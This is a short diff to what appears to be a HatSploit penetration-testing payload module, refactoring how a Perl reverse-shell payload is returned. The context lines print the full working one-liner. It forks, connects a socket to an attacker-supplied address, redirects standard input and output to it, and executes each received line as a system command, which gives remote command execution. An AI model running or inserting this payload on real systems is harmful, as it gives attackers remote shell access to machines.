@@ -73,5 +73,4 @@ class HatSploitPayload(Payload, TCPClient):
         payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
         payload = payload.replace("LOCAL_DATA", local_data)
 
-        self.payload = payload
-        self.instructions = payload
+        return payload
